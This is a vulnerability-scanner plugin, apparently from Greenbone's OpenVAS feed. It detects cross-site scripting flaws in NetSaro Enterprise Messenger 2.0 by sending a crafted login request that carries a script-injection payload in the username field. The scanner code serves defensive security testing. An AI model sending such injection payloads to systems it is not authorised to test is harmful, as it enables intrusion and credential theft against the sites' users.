if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103236" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2011-09-01 14:04:12 +0200 (Thu, 01 Sep 2011)" );
	script_bugtraq_id( 49390 );
	script_tag( name: "cvss_base", value: "2.6" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:H/Au:N/C:N/I:P/A:N" );
	script_name( "NetSaro Enterprise Messenger Cross Site Scripting and HTML Injection Vulnerabilities" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/49390" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_dependencies( "find_service.sc", "httpver.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 4990 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "impact", value: "Successful exploits will allow attacker-supplied HTML and script
  code to run in the context of the affected browser, potentially
  allowing the attacker to steal cookie-based authentication
  credentials or to control how the site is rendered to the user.
  Other attacks are also possible." );
	script_tag( name: "affected", value: "NetSaro Enterprise Messenger 2.0 is vulnerable. Other versions may
  also be affected." );
	script_tag( name: "summary", value: "NetSaro Enterprise Messenger is prone to multiple cross-site
  scripting and HTML-injection vulnerabilities because it fails to
  properly sanitize user-supplied input before using it in dynamically
  generated content." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the
  disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to
  upgrade to a newer release, disable respective features, remove the product or replace the product by
  another one." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("host_details.inc.sc");
port = http_get_port( default: 4990 );
res = http_get_cache( item: "/", port: port );
if(!res || !ContainsString( res, "<title>NetSaro Administration Console</title>" )){
	exit( 0 );
}
url = "/login.nsp";
host = http_host_name( port: port );
req = NASLString( "POST ", url, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "Content-Type: application/x-www-form-urlencoded\\r\\n", "Content-Length: 131\\r\\n", "\\r\\n", "username=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28%22vt-xss-test%22%29%3C%2Fscript%3E&password=&login=Log+In&postback=postback\\r\\n", "\\r\\n" );
res = http_keepalive_send_recv( port: port, data: req );
if(IsMatchRegexp( res, "^HTTP/1\\.[01] 200" ) && ContainsString( res, "\"></script><script>alert(\"vt-xss-test\")</script>\"" )){
	report = http_report_vuln_url( port: port, url: url );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

